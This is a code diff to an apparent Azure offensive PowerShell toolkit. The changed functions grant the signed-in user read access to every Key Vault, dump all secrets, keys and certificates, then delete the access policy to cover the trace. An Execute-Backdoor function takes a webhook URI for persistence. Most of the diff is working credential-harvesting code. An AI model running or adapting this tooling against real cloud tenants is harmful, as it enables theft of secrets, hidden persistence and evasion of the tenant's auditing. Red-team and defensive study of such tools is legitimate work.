@@ -775,7 +775,7 @@ function Get-KeyVaults
 .SYNOPSIS
     Lists the Key Vaults
 #>
-    Get-AzKeyVault
+    az keyvault list -o table
 }
 
 function Get-KeyVaultContents
@@ -793,41 +793,43 @@ function Get-KeyVaultContents
 #>
     [CmdletBinding()]
     Param(
-    [Parameter(Mandatory=$false)][String]$Name = "")
+    [Parameter(Mandatory=$false)][String]$Vault = "")
     $ErrorActionPreference= 'silentlycontinue'
      
      if($Vault -eq "")
      {
         Write-Host "Requires Vault name" -ForegroundColor Red
-        Write-Host "Usage example: Get-KeyVaultSecrets VaultName" -ForegroundColor Red
+        Write-Host "Usage example: Get-KeyVaultSecrets -Vault TestVault" -ForegroundColor Red
      }
      else
      {
         $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
-        $id=az keyvault secret list --vault-name $Name --query '[].id' -o tsv
-        if(!$id)
-        {
-            Write-Host "Detected Permissions issue, trying to fix it."
-            $access = az keyvault set-policy --name $Name --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list | Out-Null
+		$access = az keyvault set-policy --name $Vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
             if(!$access)
             {
                Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
-               return
+               continue
             }
-            az keyvault secret show --id $id | ConvertFrom-Json
-            az keyvault certificate show --id $id | ConvertFrom-Json
-            az keyvault key show --id $id | ConvertFrom-Json
-
-            return
-        }
-        else
-        {
-            az keyvault secret show --id $id | ConvertFrom-Json
-            az keyvault certificate show --id $id | ConvertFrom-Json
-            az keyvault key show --id $id | ConvertFrom-Json
-        }
-            
-     } 
+        $ids = az keyvault secret list --vault-name $Vault --query '[].id' -o tsv
+		$kids = az keyvault key list --vault-name $Vault --query '[].id' -o tsv
+		$cids = az keyvault certificate list --vault-name $Vault --query '[].id' -o tsv
+		ForEach ($i in $ids)
+		{
+			$i
+			az keyvault secret show --id $i -o table
+		}
+		ForEach ($kid in $kids)
+		{
+			$kid
+			az keyvault secret show --id $kid -o table
+		}
+		ForEach ($cid in $cids)
+		{
+			$cid
+			az keyvault secret show --id $cid -o table
+		}
+		$removeaccess = az keyvault delete-policy --name $Vault --upn $User
+	}
 }
 
 function Get-AllKeyVaultContents
@@ -838,53 +840,38 @@ function Get-AllKeyVaultContents
 
 #>
     Write-Host "Gathering all keys from key vaults, this may take a moment"
-    $vaults=az keyvault list --query '[].name' -o tsv
+    $vaults = az keyvault list --query '[].name' -o tsv
     $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
     ForEach ($vault in $vaults)
     {
-        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
-        if(!$ids)
-        {
-            Write-Host "Detected Permissions issue, trying to fix it."
-            $access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
+		$access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
             if(!$access)
             {
                Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
                continue
             }
-            $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-            $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-            ForEach ($i in $ids)
-            {
-                az keyvault secret show --id $i | ConvertFrom-Json
-            }
-            ForEach ($kid in $kids)
-            {
-                az keyvault secret show --id $kid | ConvertFrom-Json
-            }
-            ForEach ($cid in $cids)
-            {
-                az keyvault secret show --id $cid | ConvertFrom-Json
-            }
-        } 
-        else
-        {
-        $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-        $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-            ForEach ($i in $ids)
-            {
-                az keyvault secret show --id $i | ConvertFrom-Json
-            }
-            ForEach ($kid in $kids)
-            {
-                az keyvault secret show --id $kid | ConvertFrom-Json
-            }
-            ForEach ($cid in $cids)
-            {
-                az keyvault secret show --id $cid | ConvertFrom-Json
-            }
-        
-        }
+        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
+		$kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
+		$cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
+		ForEach ($i in $ids)
+		{
+			Write-Host "Vault: " $i
+			az keyvault secret show --id $i -o table
+			Write-Host ""
+		}
+		ForEach ($kid in $kids)
+		{
+			Write-Host "Vault: " $kid
+			az keyvault secret show --id $kid -o table
+			Write-Host ""
+		}
+		ForEach ($cid in $cids)
+		{
+			Write-Host "Vault: " $cid
+			az keyvault secret show --id $cid -o table
+			Write-Host ""
+		}
+		$removeaccess = az keyvault delete-policy --name $vault --upn $User
     }
 }
 
@@ -1045,7 +1032,7 @@ function Get-AllAppSecrets
         
 }
 
-function Get-AllSecrets #
+function Get-AllSecrets 
 {
 <# 
 .SYNOPSIS
@@ -1053,53 +1040,38 @@ function Get-AllSecrets #
 
 #>
     Write-Host "Gathering all keys from key vaults, this may take a moment"
-    $vaults=az keyvault list --query '[].name' -o tsv
+    $vaults = az keyvault list --query '[].name' -o tsv
     $User = az ad signed-in-user show --query '[userPrincipalName]' -o tsv
     ForEach ($vault in $vaults)
     {
-        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
-        if(!$ids)
-        {
-            Write-Host "Detected Permissions issue, trying to fix it."
-            $access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
+		$access = az keyvault set-policy --name $vault --upn $User --secret-permissions get list --key-permissions get list --storage-permissions get list --certificate-permissions get list
             if(!$access)
             {
                Write-Host "Couldn't change permissions on the Key Vault. Are you Global Contributor?"
                continue
             }
-            $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-            $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-            ForEach ($i in $ids)
-            {
-                az keyvault secret show --id $i | ConvertFrom-Json
-            }
-            ForEach ($kid in $kids)
-            {
-                az keyvault secret show --id $kid | ConvertFrom-Json
-            }
-            ForEach ($cid in $cids)
-            {
-                az keyvault secret show --id $cid | ConvertFrom-Json
-            }
-        } 
-        else
-        {
-        $kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
-        $cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
-            ForEach ($i in $ids)
-            {
-                az keyvault secret show --id $i | ConvertFrom-Json
-            }
-            ForEach ($kid in $kids)
-            {
-                az keyvault secret show --id $kid | ConvertFrom-Json
-            }
-            ForEach ($cid in $cids)
-            {
-                az keyvault secret show --id $cid | ConvertFrom-Json
-            }
-        
-        }
+        $ids = az keyvault secret list --vault-name $vault --query '[].id' -o tsv
+		$kids = az keyvault key list --vault-name $vault --query '[].id' -o tsv
+		$cids = az keyvault certificate list --vault-name $vault --query '[].id' -o tsv
+		ForEach ($i in $ids)
+		{
+			Write-Host "Vault: " $i
+			az keyvault secret show --id $i -o table
+			Write-Host ""
+		}
+		ForEach ($kid in $kids)
+		{
+			Write-Host "Vault: " $kid
+			az keyvault secret show --id $kid -o table
+			Write-Host ""
+		}
+		ForEach ($cid in $cids)
+		{
+			Write-Host "Vault: " $cid
+			az keyvault secret show --id $cid -o table
+			Write-Host ""
+		}
+		$removeaccess = az keyvault delete-policy --name $vault --upn $User
     }
     Write-Host ""
     Write-Host "Gathering all secrets from applications, this may take a moment"    
@@ -2004,7 +1976,7 @@ function Execute-Backdoor
     -URI (Obtained from output of Create-Backdoor)
 
 .EXAMPLE
-    Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvpQ%3d
+    Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvQ%3d
 #>
         [CmdletBinding()]
          Param(
@@ -2012,7 +1984,7 @@ function Execute-Backdoor
      if($URI -eq "")
      {
         Write-Host "Requires URI" -ForegroundColor Red
-        Write-Host "Usage: Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4yH61WvpQ%3d" -ForegroundColor Red
+        Write-Host "Usage: Execute-Backdoor -URI https://s16events.azure-automation.net/webhooks?token=qol1XudydN13%2bI5bilBZzbCjdzTIcfs4Fj4H61WvpQ%3d" -ForegroundColor Red
      }
      else
      {
